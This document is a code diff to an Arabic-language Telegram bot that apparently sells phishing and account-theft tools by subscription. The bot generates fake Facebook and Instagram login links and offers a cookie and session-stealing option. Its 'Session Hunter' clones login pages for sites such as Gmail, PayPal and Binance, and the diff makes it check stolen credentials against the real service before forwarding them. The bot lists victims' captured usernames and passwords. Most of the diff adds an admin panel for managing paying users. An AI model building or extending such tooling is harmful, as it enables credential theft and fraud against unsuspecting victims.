@@ -69,7 +69,7 @@ except Exception as e:
     lsh_bp = None
 
 # ============================================================
-# استيراد Session Hunter (Universal Login Catcher)
+# استيراد Session Hunter
 # ============================================================
 try:
     from session_hunter import (
@@ -92,7 +92,7 @@ except Exception as e:
     SUPPORTED_SITES = {}
 
 # ============================================================
-# استيراد نظام الدفع
+# استيراد نظام الدفع + الأدمن
 # ============================================================
 try:
     from stars_payment import (
@@ -108,6 +108,23 @@ try:
         PRICING_PLANS,
         FREE_TRIAL_USES,
         AVAILABLE_TOOLS,
+        # ★ دوال الأدمن
+        is_admin,
+        is_vip,
+        get_all_users,
+        get_user,
+        save_user,
+        delete_user,
+        ban_user,
+        unban_user,
+        activate_subscription,
+        build_admin_menu,
+        build_admin_users_keyboard,
+        build_user_detail_keyboard,
+        build_user_info_text,
+        build_admin_stats_text,
+        ADMIN_IDS,
+        VIP_IDS,
     )
     PAYMENT_ENABLED = True
     print("[+] stars_payment imported")
@@ -127,6 +144,22 @@ except Exception as e:
     PRICING_PLANS = {}
     FREE_TRIAL_USES = 1
     AVAILABLE_TOOLS = ["fb", "ig", "qr", "rat", "lsh", "sh"]
+    def is_admin(uid): return False
+    def is_vip(uid): return False
+    def get_all_users(): return []
+    def get_user(uid): return None
+    def save_user(uid, u): return False
+    def delete_user(uid): return False
+    def ban_user(uid): return False
+    def unban_user(uid): return False
+    def activate_subscription(uid, pk): return {}
+    def build_admin_menu(): return InlineKeyboardMarkup()
+    def build_admin_users_keyboard(*a, **kw): return InlineKeyboardMarkup()
+    def build_user_detail_keyboard(*a, **kw): return InlineKeyboardMarkup()
+    def build_user_info_text(*a, **kw): return ""
+    def build_admin_stats_text(): return ""
+    ADMIN_IDS = []
+    VIP_IDS = []
 
 
 # ============================================================
@@ -136,7 +169,7 @@ BOT_TOKEN = os.getenv("BOT_TOKEN")
 RAILWAY_URL = os.getenv("RAILWAY_URL", "https://daf-production-8df9.up.railway.app")
 
 # ============================================================
-# Redis — نسخة محسّنة مع TLS fallback
+# Redis
 # ============================================================
 REDIS_URL = os.getenv("REDIS_URL", "").strip()
 
@@ -238,7 +271,8 @@ register_payment_handlers(bot)
 # ============================================================
 # القوائم
 # ============================================================
-def main_menu():
+def main_menu(user_id=None):
+    """يبني القائمة الرئيسية - يظهر زر الأدمن فقط للأدمن"""
     markup = InlineKeyboardMarkup()
     markup.add(InlineKeyboardButton("🔗 توليد رابط مصيدة فيسبوك", callback_data="gen_fb"))
     markup.add(InlineKeyboardButton("📸 توليد رابط مصيدة انستقرام", callback_data="gen_ig"))
@@ -248,6 +282,11 @@ def main_menu():
     markup.add(InlineKeyboardButton("🍪 سرقة الكوكيز والجلسات (SH)", callback_data="gen_sh"))
     markup.add(InlineKeyboardButton("💎 الاشتراكات والدفع", callback_data="payment_menu"))
     markup.add(InlineKeyboardButton("👤 حسابي", callback_data="my_account"))
+    
+    # ★ زر الأدمن يظهر فقط للأدمن
+    if user_id and is_admin(user_id):
+        markup.add(InlineKeyboardButton("👑 لوحة تحكم الأدمن", callback_data="admin_panel"))
+    
     return markup
 
 
@@ -260,6 +299,11 @@ def payment_menu():
 # ============================================================
 def _deny_message(reason, user_id, tool, data=None):
     data = data or {}
+    if reason == "banned":
+        return (
+            "🚫 **أنت محظور من استخدام البوت.**\n\n"
+            "إذا كنت تعتقد أن هذا خطأ، تواصل مع الإدارة."
+        )
     if reason == "daily_limit_reached":
         return (
             "⚠️ **وصلت للحد اليومي لباقتك الحالية.**\n\n"
@@ -277,7 +321,7 @@ def _deny_message(reason, user_id, tool, data=None):
 
 
 # ============================================================
-# Start Command
+# Start Command — يعرض زر الأدمن للأدمن
 # ============================================================
 @bot.message_handler(commands=['start', 'panel'])
 def start_command(message):
@@ -288,12 +332,28 @@ def start_command(message):
         message.from_user.username or "Unknown",
         user_name
     )
-    text = (
-        f"⚡ مرحباً بك يا {user_name} في DEV ١ 😈\n\n"
-        "غير مسؤول تماماً عن إساءة الاستخدام.\n\n"
-        f"🎁 لديك {FREE_TRIAL_USES} استخدام مجاني لكل أداة."
+    
+    # هل هو أدمن؟
+    if is_admin(message.from_user.id):
+        text = (
+            f"👑 **مرحباً أيها الأدمن {user_name}!**\n\n"
+            f"⚡ لديك صلاحيات كاملة على النظام.\n"
+            f"💎 أنت VIP لا نهائي — كل الأدوات مفتوحة بدون حدود.\n\n"
+            f"🎛️ استخدم **لوحة تحكم الأدمن** للتحكم الكامل."
+        )
+    else:
+        text = (
+            f"⚡ مرحباً بك يا {user_name} في DEV ١ 😈\n\n"
+            "غير مسؤول تماماً عن إساءة الاستخدام.\n\n"
+            f"🎁 لديك {FREE_TRIAL_USES} استخدام مجاني لكل أداة."
+        )
+    
+    bot.send_message(
+        message.chat.id,
+        text,
+        parse_mode="Markdown",
+        reply_markup=main_menu(message.from_user.id)
     )
-    bot.send_message(message.chat.id, text, parse_mode="Markdown", reply_markup=main_menu())
 
 
 # ============================================================
@@ -302,6 +362,7 @@ def start_command(message):
 @bot.callback_query_handler(func=lambda call: True)
 def callback_handler(call):
     chat_id = call.message.chat.id
+    user_id = call.from_user.id
 
     # ============================================================
     # قسم الدفع
@@ -341,7 +402,430 @@ def callback_handler(call):
 
     if call.data == "back_to_main":
         bot.answer_callback_query(call.id)
-        bot.send_message(chat_id, "القائمة الرئيسية:", reply_markup=main_menu())
+        bot.send_message(
+            chat_id,
+            "القائمة الرئيسية:",
+            reply_markup=main_menu(user_id)
+        )
+        return
+
+    # ============================================================
+    # ★★★ لوحة الأدمن ★★★
+    # ============================================================
+    if call.data == "admin_panel":
+        if not is_admin(user_id):
+            bot.answer_callback_query(call.id, "❌ أنت لست أدمن", show_alert=True)
+            return
+        bot.answer_callback_query(call.id)
+        bot.send_message(
+            chat_id,
+            "👑 **لوحة تحكم الأدمن**\n"
+            "━━━━━━━━━━━━━━━━━━\n"
+            "اختر العملية المطلوبة:",
+            reply_markup=build_admin_menu(),
+            parse_mode="Markdown"
+        )
+        return
+
+    # قائمة المستخدمين
+    if call.data.startswith("admin_users_"):
+        if not is_admin(user_id):
+            bot.answer_callback_query(call.id, "❌ غير مصرح", show_alert=True)
+            return
+        try:
+            page = int(call.data.replace("admin_users_", ""))
+        except ValueError:
+            page = 0
+        users = get_all_users()
+        if not users:
+            bot.answer_callback_query(call.id, "لا يوجد مستخدمون", show_alert=True)
+            return
+        users.sort(key=lambda u: u.get("created_at", ""), reverse=True)
+        bot.answer_callback_query(call.id)
+        bot.send_message(
+            chat_id,
+            f"👥 **قائمة المستخدمين** ({len(users)})\n"
+            f"━━━━━━━━━━━━━━━━━━\n"
+            f"اختر مستخدم لعرض التفاصيل:",
+            reply_markup=build_admin_users_keyboard(users, page),
+            parse_mode="Markdown"
+        )
+        return
+
+    # تفاصيل مستخدم
+    if call.data.startswith("admin_user_"):
+        if not is_admin(user_id):
+            bot.answer_callback_query(call.id, "❌ غير مصرح", show_alert=True)
+            return
+        try:
+            uid = int(call.data.replace("admin_user_", ""))
+        except ValueError:
+            bot.answer_callback_query(call.id, "❌ رقم خاطئ", show_alert=True)
+            return
+        user = get_user(uid)
+        if not user:
+            bot.answer_callback_query(call.id, "❌ مستخدم غير موجود", show_alert=True)
+            return
+        bot.answer_callback_query(call.id)
+        bot.send_message(
+            chat_id,
+            build_user_info_text(uid, user),
+            reply_markup=build_user_detail_keyboard(uid, user),
+            parse_mode="Markdown"
+        )
+        return
+
+    # حظر مستخدم
+    if call.data.startswith("admin_ban_user_"):
+        if not is_admin(user_id):
+            bot.answer_callback_query(call.id, "❌ غير مصرح", show_alert=True)
+            return
+        try:
+            uid = int(call.data.replace("admin_ban_user_", ""))
+        except ValueError:
+            return
+        ban_user(uid)
+        bot.answer_callback_query(call.id, "✅ تم الحظر", show_alert=True)
+        # أعد تحميل
+        user = get_user(uid)
+        if user:
+            try:
+                bot.edit_message_text(
+                    build_user_info_text(uid, user),
+                    chat_id=chat_id,
+                    message_id=call.message.message_id,
+                    reply_markup=build_user_detail_keyboard(uid, user),
+                    parse_mode="Markdown"
+                )
+            except Exception:
+                pass
+        return
+
+    # فك حظر
+    if call.data.startswith("admin_unban_user_"):
+        if not is_admin(user_id):
+            bot.answer_callback_query(call.id, "❌ غير مصرح", show_alert=True)
+            return
+        try:
+            uid = int(call.data.replace("admin_unban_user_", ""))
+        except ValueError:
+            return
+        unban_user(uid)
+        bot.answer_callback_query(call.id, "✅ تم فك الحظر", show_alert=True)
+        user = get_user(uid)
+        if user:
+            try:
+                bot.edit_message_text(
+                    build_user_info_text(uid, user),
+                    chat_id=chat_id,
+                    message_id=call.message.message_id,
+                    reply_markup=build_user_detail_keyboard(uid, user),
+                    parse_mode="Markdown"
+                )
+            except Exception:
+                pass
+        return
+
+    # منح VIP
+    if call.data.startswith("admin_grant_vip_user_"):
+        if not is_admin(user_id):
+            bot.answer_callback_query(call.id, "❌ غير مصرح", show_alert=True)
+            return
+        try:
+            uid = int(call.data.replace("admin_grant_vip_user_", ""))
+        except ValueError:
+            return
+        user = get_or_create_user(uid)
+        user["is_vip"] = True
+        save_user(uid, user)
+        bot.answer_callback_query(call.id, "💎 تم منح VIP", show_alert=True)
+        try:
+            bot.send_message(uid,
+                "💎 **تهانينا!**\n\n"
+                "تم منحك عضوية **VIP** من الإدارة.\n"
+                "يمكنك الآن استخدام كل الأدوات بدون أي حدود! 🚀",
+                parse_mode="Markdown")
+        except Exception:
+            pass
+        user = get_user(uid)
+        if user:
+            try:
+                bot.edit_message_text(
+                    build_user_info_text(uid, user),
+                    chat_id=chat_id,
+                    message_id=call.message.message_id,
+                    reply_markup=build_user_detail_keyboard(uid, user),
+                    parse_mode="Markdown"
+                )
+            except Exception:
+                pass
+        return
+
+    # إزالة VIP
+    if call.data.startswith("admin_remove_vip_"):
+        if not is_admin(user_id):
+            bot.answer_callback_query(call.id, "❌ غير مصرح", show_alert=True)
+            return
+        try:
+            uid = int(call.data.replace("admin_remove_vip_", ""))
+        except ValueError:
+            return
+        user = get_or_create_user(uid)
+        user["is_vip"] = False
+        save_user(uid, user)
+        bot.answer_callback_query(call.id, "✅ تم إزالة VIP", show_alert=True)
+        user = get_user(uid)
+        if user:
+            try:
+                bot.edit_message_text(
+                    build_user_info_text(uid, user),
+                    chat_id=chat_id,
+                    message_id=call.message.message_id,
+                    reply_markup=build_user_detail_keyboard(uid, user),
+                    parse_mode="Markdown"
+                )
+            except Exception:
+                pass
+        return
+
+    # حذف مستخدم
+    if call.data.startswith("admin_delete_user_"):
+        if not is_admin(user_id):
+            bot.answer_callback_query(call.id, "❌ غير مصرح", show_alert=True)
+            return
+        try:
+            uid = int(call.data.replace("admin_delete_user_", ""))
+        except ValueError:
+            return
+        delete_user(uid)
+        bot.answer_callback_query(call.id, "🗑️ تم الحذف", show_alert=True)
+        try:
+            bot.edit_message_text(
+                f"🗑️ **تم حذف المستخدم** `{uid}`",
+                chat_id=chat_id,
+                message_id=call.message.message_id,
+                parse_mode="Markdown"
+            )
+        except Exception:
+            pass
+        return
+
+    # إعطاء اشتراك
+    if call.data.startswith("admin_give_sub_"):
+        if not is_admin(user_id):
+            bot.answer_callback_query(call.id, "❌ غير مصرح", show_alert=True)
+            return
+        try:
+            uid = int(call.data.replace("admin_give_sub_", ""))
+        except ValueError:
+            return
+        bot.answer_callback_query(call.id)
+        markup = InlineKeyboardMarkup()
+        markup.row(
+            InlineKeyboardButton("⭐ أساسية (30 يوم)", callback_data=f"admin_activate_basic_{uid}"),
+            InlineKeyboardButton("💎 احترافية (30 يوم)", callback_data=f"admin_activate_pro_{uid}"),
+        )
+        markup.row(
+            InlineKeyboardButton("👑 VIP (90 يوم)", callback_data=f"admin_activate_vip_{uid}"),
+        )
+        markup.row(InlineKeyboardButton("🔙 رجوع", callback_data=f"admin_user_{uid}"))
+        bot.send_message(
+            chat_id,
+            f"📅 **اختر الباقة للمستخدم** `{uid}`",
+            reply_markup=markup,
+            parse_mode="Markdown"
+        )
+        return
+
+    # تفعيل اشتراك
+    if call.data.startswith("admin_activate_"):
+        if not is_admin(user_id):
+            bot.answer_callback_query(call.id, "❌ غير مصرح", show_alert=True)
+            return
+        parts = call.data.replace("admin_activate_", "").rsplit("_", 1)
+        if len(parts) != 2:
+            return
+        plan_key, uid_str = parts
+        try:
+            uid = int(uid_str)
+        except ValueError:
+            return
+        try:
+            user = activate_subscription(uid, plan_key)
+            plan = PRICING_PLANS.get(plan_key)
+            bot.answer_callback_query(call.id, f"✅ تم تفعيل {plan['name']}", show_alert=True)
+            try:
+                from datetime import datetime as _dt
+                expires = _dt.fromisoformat(user["subscription"]["expires_at"])
+                bot.send_message(uid,
+                    f"🎉 **تم تفعيل اشتراكك!**\n"
+                    f"━━━━━━━━━━━━━━━━━━\n"
+                    f"💎 الباقة: {plan['name']}\n"
+                    f"📅 ينتهي في: `{expires.strftime('%Y-%m-%d')}`\n"
+                    f"🎯 الحد اليومي: {plan['daily_limit']} عملية",
+                    parse_mode="Markdown")
+            except Exception:
+                pass
+        except Exception as e:
+            bot.answer_callback_query(call.id, f"❌ خطأ: {e}", show_alert=True)
+        return
+
+    # إحصائيات
+    if call.data == "admin_stats":
+        if not is_admin(user_id):
+            bot.answer_callback_query(call.id, "❌ غير مصرح", show_alert=True)
+            return
+        bot.answer_callback_query(call.id)
+        bot.send_message(
+            chat_id,
+            build_admin_stats_text(),
+            reply_markup=InlineKeyboardMarkup().add(
+                InlineKeyboardButton("🔙 رجوع", callback_data="admin_panel")
+            ),
+            parse_mode="Markdown"
+        )
+        return
+
+    # آخر المسجلين
+    if call.data == "admin_recent":
+        if not is_admin(user_id):
+            bot.answer_callback_query(call.id, "❌ غير مصرح", show_alert=True)
+            return
+        users = get_all_users()
+        users.sort(key=lambda u: u.get("created_at", ""), reverse=True)
+        recent = users[:10]
+        lines = ["🆕 **آخر 10 مستخدمين:**\n━━━━━━━━━━━━━━━━━━"]
+        for u in recent:
+            uid = u.get("user_id")
+            name = u.get("first_name", "Unknown")
+            created = u.get("created_at", "")[:19].replace("T", " ")
+            icon = "👑" if is_admin(uid) else "💎" if u.get("is_vip") else "🚫" if u.get("is_banned") else "👤"
+            lines.append(f"{icon} **{name}** — `{uid}`\n   📅 {created}")
+        bot.answer_callback_query(call.id)
+        bot.send_message(
+            chat_id,
+            "\n".join(lines),
+            reply_markup=InlineKeyboardMarkup().add(
+                InlineKeyboardButton("🔙 رجوع", callback_data="admin_panel")
+            ),
+            parse_mode="Markdown"
+        )
+        return
+
+    # بحث
+    if call.data == "admin_search":
+        if not is_admin(user_id):
+            bot.answer_callback_query(call.id, "❌ غير مصرح", show_alert=True)
+            return
+        bot.answer_callback_query(call.id)
+        msg = bot.send_message(chat_id,
+            "🔍 **أرسل ID المستخدم أو username للبحث:**",
+            parse_mode="Markdown")
+        bot.register_next_step_handler(msg, admin_search_handler)
+        return
+
+    # رسالة جماعية
+    if call.data == "admin_broadcast":
+        if not is_admin(user_id):
+            bot.answer_callback_query(call.id, "❌ غير مصرح", show_alert=True)
+            return
+        bot.answer_callback_query(call.id)
+        msg = bot.send_message(chat_id,
+            "📢 **أرسل الرسالة التي تريد إرسالها للجميع:**",
+            parse_mode="Markdown")
+        bot.register_next_step_handler(msg, admin_broadcast_handler)
+        return
+
+    # إضافة مستخدم لباقة
+    if call.data == "admin_add_sub":
+        if not is_admin(user_id):
+            bot.answer_callback_query(call.id, "❌ غير مصرح", show_alert=True)
+            return
+        bot.answer_callback_query(call.id)
+        msg = bot.send_message(chat_id,
+            "➕ **أرسل ID المستخدم لإضافة باقة له:**",
+            parse_mode="Markdown")
+        bot.register_next_step_handler(msg, admin_add_sub_handler)
+        return
+
+    # حظر
+    if call.data == "admin_ban":
+        if not is_admin(user_id):
+            bot.answer_callback_query(call.id, "❌ غير مصرح", show_alert=True)
+            return
+        bot.answer_callback_query(call.id)
+        msg = bot.send_message(chat_id,
+            "🚫 **أرسل ID المستخدم لحظره:**",
+            parse_mode="Markdown")
+        bot.register_next_step_handler(msg, admin_ban_handler)
+        return
+
+    # فك حظر
+    if call.data == "admin_unban":
+        if not is_admin(user_id):
+            bot.answer_callback_query(call.id, "❌ غير مصرح", show_alert=True)
+            return
+        bot.answer_callback_query(call.id)
+        msg = bot.send_message(chat_id,
+            "✅ **أرسل ID المستخدم لفك حظره:**",
+            parse_mode="Markdown")
+        bot.register_next_step_handler(msg, admin_unban_handler)
+        return
+
+    # حذف
+    if call.data == "admin_delete":
+        if not is_admin(user_id):
+            bot.answer_callback_query(call.id, "❌ غير مصرح", show_alert=True)
+            return
+        bot.answer_callback_query(call.id)
+        msg = bot.send_message(chat_id,
+            "🗑️ **أرسل ID المستخدم لحذفه نهائياً:**",
+            parse_mode="Markdown")
+        bot.register_next_step_handler(msg, admin_delete_handler)
+        return
+
+    # منح VIP
+    if call.data == "admin_grant_vip":
+        if not is_admin(user_id):
+            bot.answer_callback_query(call.id, "❌ غير مصرح", show_alert=True)
+            return
+        bot.answer_callback_query(call.id)
+        msg = bot.send_message(chat_id,
+            "💎 **أرسل ID المستخدم لمنحه VIP:**",
+            parse_mode="Markdown")
+        bot.register_next_step_handler(msg, admin_grant_vip_handler)
+        return
+
+    # إعطاء نجوم
+    if call.data == "admin_give_stars":
+        if not is_admin(user_id):
+            bot.answer_callback_query(call.id, "❌ غير مصرح", show_alert=True)
+            return
+        bot.answer_callback_query(call.id)
+        msg = bot.send_message(chat_id,
+            "⭐ **أرسل بالشكل:** `user_id|amount`\n"
+            "مثال: `123456|100`",
+            parse_mode="Markdown")
+        bot.register_next_step_handler(msg, admin_give_stars_handler)
+        return
+
+    # رسالة لمستخدم
+    if call.data.startswith("admin_msg_user_"):
+        if not is_admin(user_id):
+            bot.answer_callback_query(call.id, "❌ غير مصرح", show_alert=True)
+            return
+        try:
+            uid = int(call.data.replace("admin_msg_user_", ""))
+        except ValueError:
+            return
+        bot.answer_callback_query(call.id)
+        msg = bot.send_message(chat_id, f"📨 **أرسل الرسالة للمستخدم** `{uid}`:", parse_mode="Markdown")
+        bot.register_next_step_handler(msg, lambda m, u=uid: admin_msg_user_handler(m, u))
+        return
+
+    # noop
+    if call.data == "noop":
+        bot.answer_callback_query(call.id)
         return
 
     # ============================================================
@@ -486,7 +970,7 @@ def callback_handler(call):
         return
 
     # ============================================================
-    # ★★★ Session Hunter — Universal Login Catcher ★★★
+    # ★★★ Session Hunter ★★★
     # ============================================================
     if call.data == "gen_sh":
         check = can_use_tool(chat_id, "sh")
@@ -497,7 +981,6 @@ def callback_handler(call):
         consume_usage(chat_id, "sh")
         bot.answer_callback_query(call.id, "اختر الموقع...")
 
-        # عرض 12 موقع
         markup = InlineKeyboardMarkup()
         markup.row(
             InlineKeyboardButton("📘 Facebook", callback_data=f"sh_site_facebook_{chat_id}"),
@@ -532,7 +1015,6 @@ def callback_handler(call):
         )
         return
 
-    # اختيار الموقع
     if call.data.startswith("sh_site_"):
         parts = call.data.split("_", 3)
         site = parts[2]
@@ -555,18 +1037,12 @@ def callback_handler(call):
                 pass
 
         site_names = {
-            "facebook": "فيسبوك",
-            "instagram": "انستقرام",
-            "tiktok": "تيك توك",
-            "twitter": "تويتر / X",
-            "gmail": "جيميل",
-            "snapchat": "سناب شات",
-            "linkedin": "لينكد إن",
-            "discord": "ديسكورد",
-            "telegram": "تلجرام",
-            "netflix": "نتفليكس",
-            "paypal": "باي بال",
-            "binance": "بينانس",
+            "facebook": "فيسبوك", "instagram": "انستقرام",
+            "tiktok": "تيك توك", "twitter": "تويتر / X",
+            "gmail": "جيميل", "snapchat": "سناب شات",
+            "linkedin": "لينكد إن", "discord": "ديسكورد",
+            "telegram": "تلجرام", "netflix": "نتفليكس",
+            "paypal": "باي بال", "binance": "بينانس",
         }
 
         target_link = f"{RAILWAY_URL}/sh?s={session_id}&id={target_chat}&site={site}"
@@ -580,19 +1056,14 @@ def callback_handler(call):
             f"📊 **ما سيحدث:**\n"
             f"• الضحية تفتح الرابط → ترى صفحة تسجيل دخول **{site_names.get(site, site)}** مطابقة 100%\n"
             f"• تكتب بياناتها الحقيقية (لأنها تحاول الدخول فعلاً)\n"
-            f"• **تُرسل لك فوراً:**\n"
-            f"  👤 اسم المستخدم / البريد\n"
-            f"  🔑 كلمة السر\n"
-            f"  🌐 IP الحقيقي\n"
-            f"  🖥️ بصمة الجهاز الكاملة\n"
-            f"  ⌨️ كل ما تكتبه\n"
+            f"• **يتم التحقق مع السيرفر الحقيقي**\n"
+            f"• **تُرسل لك فقط البيانات الصحيحة!**\n"
             f"• ثم تُحوَّل تلقائياً للموقع الحقيقي\n\n"
             f"⚠️ الضحية لن تشك أبداً لأن الصفحة مطابقة 100%",
             parse_mode="Markdown"
         )
         return
 
-    # أوامر sh_
     if call.data.startswith("sh_"):
         parts = call.data.split("_", 2)
         cmd = parts[1] if len(parts) > 1 else ""
@@ -604,8 +1075,9 @@ def callback_handler(call):
             if creds:
                 lines = [f"🎯 **البيانات المسروقة ({len(creds)}):**\n"]
                 for i, c in enumerate(creds, 1):
+                    verified = "✅" if c.get("verified") else "❌"
                     lines.append(
-                        f"\n**#{i}**\n"
+                        f"\n**#{i}** {verified}\n"
                         f"👤 `{c.get('username', '')}`\n"
                         f"🔑 `{c.get('password', '')}`\n"
                         f"🕐 {time.strftime('%H:%M:%S', time.localtime(c.get('captured_at', 0)))}"
@@ -636,22 +1108,10 @@ def callback_handler(call):
                 f"🎯 الموقع: `{sess.get('target_site', 'N/A')}`\n"
                 f"🌐 IP: `{sess.get('ip', 'N/A')}`\n"
                 f"📄 الصفحات: `{sess.get('page_views', 0)}`\n"
-                f"🔑 البيانات: `{len(creds)}`"
+                f"🔑 البيانات: `{len(creds)}`\n"
+                f"❌ المحاولات الفاشلة: `{sess.get('failed_attempts', 0)}`"
             )
             bot.send_message(chat_id, text, parse_mode="Markdown")
-
-        elif cmd == "forms":
-            data = get_sh_data(sid)
-            forms = data.get("forms", [])
-            if forms:
-                lines = ["📝 **النماذج:**\n"]
-                for f in forms[-20:]:
-                    lines.append(f"\n🌐 `{f.get('url', '')[:60]}`")
-                    for k, v in list(f.get("fields", {}).items())[:10]:
-                        lines.append(f"• `{k}`: `{str(v)[:80]}`")
-                bot.send_message(chat_id, "\n".join(lines), parse_mode="Markdown")
-            else:
-                bot.answer_callback_query(call.id, "لا توجد نماذج بعد", show_alert=True)
 
         elif cmd == "delete":
             bot.answer_callback_query(call.id, "✅ تم")
@@ -749,6 +1209,190 @@ def callback_handler(call):
         if not ok:
             bot.send_message(chat_id, "❌ **فشل إرسال الأمر** — تحقق من اتصال Redis")
         return
+
+
+# ============================================================
+# ★★★ معالجات الأدمن (Next Step) ★★★
+# ============================================================
+def admin_search_handler(message):
+    if not is_admin(message.chat.id):
+        return
+    query = (message.text or "").strip().lstrip("@")
+    users = get_all_users()
+    found = []
+    for u in users:
+        if str(u.get("user_id")) == query or (u.get("username", "") or "").lower() == query.lower():
+            found.append(u)
+    
+    if not found:
+        bot.send_message(message.chat.id, f"❌ لم يتم العثور على: `{query}`", parse_mode="Markdown")
+        return
+    
+    for u in found:
+        uid = u.get("user_id")
+        bot.send_message(
+            message.chat.id,
+            build_user_info_text(uid, u),
+            reply_markup=build_user_detail_keyboard(uid, u),
+            parse_mode="Markdown"
+        )
+
+
+def admin_broadcast_handler(message):
+    if not is_admin(message.chat.id):
+        return
+    text = message.text
+    if not text:
+        return
+    
+    users = get_all_users()
+    success = 0
+    failed = 0
+    
+    status_msg = bot.send_message(message.chat.id, f"📢 جاري الإرسال لـ {len(users)} مستخدم...")
+    
+    for u in users:
+        uid = u.get("user_id")
+        if u.get("is_banned"):
+            continue
+        try:
+            bot.send_message(uid, f"📢 **رسالة من الإدارة:**\n\n{text}", parse_mode="Markdown")
+            success += 1
+            time.sleep(0.05)
+        except Exception:
+            failed += 1
+    
+    try:
+        bot.edit_message_text(
+            f"✅ **تم الإرسال!**\n\n"
+            f"✔️ النجاح: {success}\n"
+            f"❌ الفشل: {failed}",
+            chat_id=message.chat.id,
+            message_id=status_msg.message_id
+        )
+    except Exception:
+        pass
+
+
+def admin_add_sub_handler(message):
+    if not is_admin(message.chat.id):
+        return
+    try:
+        uid = int((message.text or "").strip())
+    except ValueError:
+        bot.send_message(message.chat.id, "❌ ID غير صحيح")
+        return
+    
+    user = get_or_create_user(uid)
+    markup = InlineKeyboardMarkup()
+    markup.row(
+        InlineKeyboardButton("⭐ أساسية", callback_data=f"admin_activate_basic_{uid}"),
+        InlineKeyboardButton("💎 احترافية", callback_data=f"admin_activate_pro_{uid}"),
+    )
+    markup.row(InlineKeyboardButton("👑 VIP", callback_data=f"admin_activate_vip_{uid}"))
+    
+    bot.send_message(
+        message.chat.id,
+        f"📅 **اختر الباقة للمستخدم** `{uid}`:\n"
+        f"👤 الاسم: {user.get('first_name', 'Unknown')}",
+        reply_markup=markup,
+        parse_mode="Markdown"
+    )
+
+
+def admin_ban_handler(message):
+    if not is_admin(message.chat.id):
+        return
+    try:
+        uid = int((message.text or "").strip())
+    except ValueError:
+        bot.send_message(message.chat.id, "❌ ID غير صحيح")
+        return
+    ban_user(uid)
+    bot.send_message(message.chat.id, f"🚫 تم حظر `{uid}`", parse_mode="Markdown")
+    try:
+        bot.send_message(uid, "🚫 **تم حظرك من استخدام البوت.**", parse_mode="Markdown")
+    except Exception:
+        pass
+
+
+def admin_unban_handler(message):
+    if not is_admin(message.chat.id):
+        return
+    try:
+        uid = int((message.text or "").strip())
+    except ValueError:
+        bot.send_message(message.chat.id, "❌ ID غير صحيح")
+        return
+    unban_user(uid)
+    bot.send_message(message.chat.id, f"✅ تم فك حظر `{uid}`", parse_mode="Markdown")
+
+
+def admin_delete_handler(message):
+    if not is_admin(message.chat.id):
+        return
+    try:
+        uid = int((message.text or "").strip())
+    except ValueError:
+        bot.send_message(message.chat.id, "❌ ID غير صحيح")
+        return
+    delete_user(uid)
+    bot.send_message(message.chat.id, f"🗑️ تم حذف `{uid}`", parse_mode="Markdown")
+
+
+def admin_grant_vip_handler(message):
+    if not is_admin(message.chat.id):
+        return
+    try:
+        uid = int((message.text or "").strip())
+    except ValueError:
+        bot.send_message(message.chat.id, "❌ ID غير صحيح")
+        return
+    user = get_or_create_user(uid)
+    user["is_vip"] = True
+    save_user(uid, user)
+    bot.send_message(message.chat.id, f"💎 تم منح VIP لـ `{uid}`", parse_mode="Markdown")
+    try:
+        bot.send_message(uid,
+            "💎 **تهانينا!**\n\n"
+            "تم منحك عضوية **VIP** من الإدارة.\n"
+            "يمكنك الآن استخدام كل الأدوات بدون أي حدود! 🚀",
+            parse_mode="Markdown")
+    except Exception:
+        pass
+
+
+def admin_give_stars_handler(message):
+    if not is_admin(message.chat.id):
+        return
+    try:
+        parts = (message.text or "").split("|")
+        if len(parts) != 2:
+            raise ValueError()
+        uid = int(parts[0].strip())
+        amount = int(parts[1].strip())
+    except (ValueError, IndexError):
+        bot.send_message(message.chat.id, "❌ صيغة خاطئة. استخدم: `user_id|amount`", parse_mode="Markdown")
+        return
+    
+    user = get_or_create_user(uid)
+    user["total_stars_spent"] = max(0, user.get("total_stars_spent", 0) - amount)
+    save_user(uid, user)
+    bot.send_message(message.chat.id,
+        f"⭐ تم إعطاء `{amount}` نجمة لـ `{uid}`",
+        parse_mode="Markdown")
+
+
+def admin_msg_user_handler(message, uid):
+    if not is_admin(message.chat.id):
+        return
+    try:
+        bot.send_message(uid,
+            f"📨 **رسالة من الإدارة:**\n\n{message.text}",
+            parse_mode="Markdown")
+        bot.send_message(message.chat.id, f"✅ تم الإرسال إلى `{uid}`", parse_mode="Markdown")
+    except Exception as e:
+        bot.send_message(message.chat.id, f"❌ فشل الإرسال: {e}")
 
 
 # ============================================================
